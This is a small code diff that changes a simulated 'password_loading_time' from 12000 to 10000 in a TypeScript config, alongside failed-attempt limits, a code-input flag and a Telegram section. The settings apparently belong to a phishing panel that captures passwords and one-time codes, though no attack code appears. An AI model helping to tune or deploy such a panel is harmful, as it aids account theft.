@@ -22,7 +22,7 @@ const defaultConfig: Config = {
     max_failed_code_attempts: 3,
     max_failed_password_attempts: 1,
     page_loading_time: 5000,
-    password_loading_time: 12000,
+    password_loading_time: 10000,
     code_input_enabled: true,
   },
   telegram: {
